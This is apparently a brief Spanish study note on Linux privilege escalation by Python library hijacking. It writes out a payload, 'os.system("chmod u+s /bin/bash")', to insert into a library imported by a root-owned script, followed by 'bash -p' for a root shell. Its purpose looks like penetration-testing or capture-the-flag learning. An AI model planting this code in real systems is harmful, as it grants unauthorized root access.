Primero hay que localizar un Script que el dueño sea root:
![[Pasted image 20221025202417.png]]
Luego al entrar a ese script, veremos que se utiliza alguna librería, y deberemos buscarla en /usr/lib/python... 
![[Pasted image 20221025202505.png]]

Entonces, ahora en la librería lo que tenemos que poner es lo siguiente:
`import os
`os.system("chmod u+s /bin/bash")`
![[Pasted image 20221025202557.png]]
Esto lo que hará es que le dará a la bash permisos de superusuario.
ahora solamente deberemos insertar `bash -p` y listo.
![[Pasted image 20221025202727.png]]